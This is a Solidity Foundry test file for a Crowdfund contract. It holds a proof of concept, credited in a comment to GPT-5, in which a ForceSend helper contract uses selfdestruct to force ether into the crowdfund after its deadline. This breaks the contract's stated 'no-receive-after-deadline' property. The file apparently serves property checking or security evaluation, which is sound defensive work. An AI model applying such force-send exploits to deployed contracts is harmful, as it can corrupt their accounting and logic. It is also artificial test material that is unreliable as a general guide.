// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.2;
 
import {Test} from "forge-std/Test.sol";
import {Crowdfund} from "../src/Crowdfund_v1.sol";
 
contract ForceSend {
    function attack(address payable target) external payable { selfdestruct(target); }
}
 
contract CrowdfundTest is Test {
 
    Crowdfund public c;
    uint end_donate;
    uint goal;
 
    function setUp() public {
        
        // Deploy Crowdfund with a future deadline and a goal
        address payable owner = payable(address(this));
        end_donate = block.number + 10;
        goal = 10 ether;
        c = new Crowdfund(owner, end_donate, goal);
    }
 
    // no-receive-after-deadline:
    // the contract balance does not increase after the end of the donation phase.
 
    // PoC produced by GPT-5:
    // - Deploy Crowdfund with some end_donate = E in the future.
    // - Wait until block.number > E.
    // - From an auxiliary contract:
    //   contract ForceSend { function attack(address payable target) external payable { selfdestruct(target); } }
    // - Call attack on ForceSend with target = Crowdfund’s address and send 1 ether.
    //   This will increase the Crowdfund balance after the end of the donation phase.
 
 
    function test_no_receive_after_deadline() public {
        ForceSend _ForceSend = new ForceSend();
        address user = address(456);
 
        // Before block E
        vm.roll(end_donate - 1);
 
        uint Crowdfund_balance_before = address(c).balance;        // Balance of Crowdfund before attack()
 
        // After block E
        vm.roll(end_donate + 1);
 
        // Call attack on ForceSend with target = Crowdfund’s address and send 1 ether.
        vm.deal(user, 1 ether);
        vm.prank(user);
        _ForceSend.attack{value: 1 ether}(payable(address(c)));
 
        uint Crowdfund_balance_after = address(c).balance;        // Balance of Crowdfund after attack()
 
        // the contract balance DOES increase after the end of the donation phase.        
        assert(Crowdfund_balance_after > Crowdfund_balance_before);
    }
 
}